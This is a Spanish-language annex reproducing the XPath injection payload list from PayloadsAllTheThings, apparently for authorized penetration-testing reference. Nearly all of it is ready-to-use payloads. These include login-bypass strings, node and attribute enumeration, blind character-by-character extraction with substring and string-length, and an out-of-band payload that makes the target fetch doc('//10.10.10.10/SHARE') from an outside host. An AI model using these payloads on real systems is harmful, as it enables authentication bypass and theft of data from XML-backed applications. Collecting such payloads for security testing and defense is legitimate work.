# XPath injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XPATH Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XPATH%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. XPATH Inyección / Metodología

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

## 2. Metodología / Ciega Exploitation

```sql
    and string-length(account)=SIZE_INT
```

```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

### Variantes presentes en tablas o texto del apartado

```text
codepoints-to-string
```

## 3. Metodología / Fuera de banda Exploitation

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
